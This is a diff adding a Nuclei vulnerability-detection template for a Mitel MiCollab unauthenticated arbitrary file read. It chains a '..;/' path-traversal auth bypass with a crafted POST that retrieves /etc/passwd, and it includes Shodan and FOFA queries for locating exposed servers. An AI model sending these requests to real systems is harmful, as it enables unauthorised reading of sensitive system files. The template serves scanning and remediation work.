@@ -1,0 +1,55 @@
+id: mitel-arbitary-file-read
+
+info:
+  name: Mitel MiCollab - Arbitary File Read
+  author: DhiyaneshDk,watchTowr
+  severity: critical
+  description: |
+    The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files from the underlying file system on a Mitel Collab server. Exploiting this flaw involves sending specially crafted requests to the server, bypassing access controls and allowing the attacker to retrieve sensitive files.
+  remediation: |
+    Ensure that the application properly validates and sanitizes user input to prevent directory traversal attacks. Use a whitelist approach for allowed directories and employ proper access controls.
+  reference:
+    - https://github.com/watchtowrlabs/Mitel-MiCollab-Auth-Bypass_CVE-2024-41713
+    - https://labs.watchtowr.com/where-theres-smoke-theres-fire-mitel-micollab-cve-2024-35286-cve-2024-41713-and-an-0day/
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: mitel
+    product: cmg_suite
+    shodan-query: http.html:"Mitel Networks"
+    fofa-query: body="mitel networks"
+  tags: mitel,lfi,cmg-suite,auth-bypass
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /npm-pwg/..;/usp/searchUsers.do HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "users"
+          - "Network Element"
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _transaction=%3Ctransaction+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2F10%2FXMLSchema-instance%22+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CtransactionNum+xsi%3Atype%3D%22xsd%3Along%22%3E2%3C%2FtransactionNum%3E%3Coperations+xsi%3Atype%3D%22xsd%3AList%22%3E%3Celem+xsi%3Atype%3D%22xsd%3AObject%22%3E%3Ccriteria+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3E..%2F..%2F..%2Fetc%2Fpasswd%3C%2FreportName%3E%3C%2Fcriteria%3E%3CoperationConfig+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CdataSource%3Esummary_reports%3C%2FdataSource%3E%3CoperationType%3Efetch%3C%2FoperationType%3E%3C%2FoperationConfig%3E%3CappID%3EbuiltinApplication%3C%2FappID%3E%3Coperation%3EdownloadReport%3C%2Foperation%3E%3ColdValues+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3Ex.txt%3C%2FreportName%3E%3C%2FoldValues%3E%3C%2Felem%3E%3C%2Foperations%3E%3Cjscallback%3Ex%3C%2Fjscallback%3E%3C%2Ftransaction%3E&protocolVersion=1.0&__iframeTarget__=x
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "micollab_api:.*:.*"
+# digest: 4a0a0047304502210087b42e33947bfcf33d596c352c056bceb461d20169bc10871c80013e97e220dd02205fa83c903409e3b55e151aaef62f19d02e5f4d12880449724c1fec94299d1ad2:922c64590222798bb761d5b6d8e72950
